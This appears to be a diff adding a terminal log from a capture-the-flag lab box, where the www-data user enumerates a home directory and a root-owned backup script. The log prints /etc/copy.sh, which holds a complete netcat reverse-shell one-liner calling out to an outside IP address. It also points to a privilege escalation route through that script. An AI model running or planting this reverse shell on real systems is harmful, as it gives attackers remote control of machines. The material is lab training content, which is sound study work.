@@ -1,0 +1,33 @@
+???
+
+www-data@THM-Chal:/home/itguy$ cat backup.pl
+cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+
+www-data@THM-Chal:/home/itguy$ ls -l
+ls -l
+total 56
+drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Desktop
+drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Documents
+drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Downloads
+drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Music
+drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Pictures
+drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Public
+drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Templates
+drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Videos
+-rw-r--r-x 1 root  root    47 Nov 29  2019 backup.pl
+-rw-r--r-- 1 itguy itguy 8980 Nov 29  2019 examples.desktop
+-rw-rw-r-- 1 itguy itguy   16 Nov 29  2019 mysql_login.txt
+-rw-rw-r-- 1 itguy itguy   38 Nov 29  2019 user.txt
+
+
+
+www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
+cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+www-data@THM-Chal:/home/itguy$ ls -lh /etc/copy.sh
+ls -lh /etc/copy.sh
+
